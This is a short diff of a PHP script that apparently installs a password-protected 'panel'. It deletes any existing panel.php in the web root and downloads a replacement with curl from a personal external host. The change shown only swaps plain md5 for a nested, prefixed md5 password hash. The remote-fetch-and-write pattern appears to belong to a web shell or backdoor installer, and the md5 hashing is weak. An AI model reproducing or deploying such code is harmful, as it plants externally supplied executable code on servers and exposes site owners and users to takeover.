@@ -17,7 +17,7 @@ unset($posi);
 if(!empty($_POST['pass'])){
 $panel=$root.'/panel.php';
 if(is_file($panel)) unlink($panel);
-$password=md5($_POST['pass']);
+$password=md5('VinhNoName:'.md5($_POST['pass']));
 $fp=fopen($panel,'w');
 $ch=curl_init();
 curl_setopt($ch,CURLOPT_URL,'http://v-vinhjaxt.rhcloud.com/panel.php?tai=panel.php');
